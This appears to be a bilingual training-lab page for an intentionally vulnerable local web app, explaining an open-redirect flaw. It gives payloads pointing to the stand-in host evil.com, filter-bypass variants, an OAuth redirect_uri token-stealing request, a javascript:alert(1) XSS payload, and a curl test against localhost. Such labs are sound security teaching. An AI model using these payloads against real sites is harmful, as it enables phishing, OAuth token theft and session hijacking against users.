Este portal redirige a los usuarios tras completar acciones. El parámetro de destino no está validado.
Ejemplos
# Redirección a sitio externo (phishing)
GET /open_redirect?url=https://evil.com
# Bypass de filtros básicos
GET /open_redirect?url=//evil.com
GET /open_redirect?url=https://trusted.com.evil.com
# OAuth token stealing
GET /oauth/callback?redirect_uri=https://evil.com

Pasos de explotación

  1. El endpoint /open_redirect?url= redirige sin validar el dominio destino.
  2. Úsalo para robar tokens OAuth: convence al usuario de hacer clic en una URL legítima que redirige a tu servidor malicioso.
  3. Bypass de filtros: //evil.com, /\evil.com, https:evil.com
  4. En combinación con XSS: javascript:alert(1) como URL puede ejecutar código en algunos navegadores.
  5. Impacto real: phishing avanzado, robo de sesiones, bypass de CSP.
curl -v "http://localhost:5000/open_redirect?url=https://evil.com"
# Observa: Location: https://evil.com en la respuesta

Exploitation Steps

  1. The /open_redirect?url= endpoint redirects without validating the destination domain.
  2. Use it to steal OAuth tokens: trick users into clicking a legitimate-looking URL that redirects to your server.
  3. Filter bypasses: //evil.com, /\evil.com, https:evil.com
  4. Combined with XSS: javascript:alert(1) as URL may execute code in some browsers.
  5. Real impact: advanced phishing, session hijacking, CSP bypass.
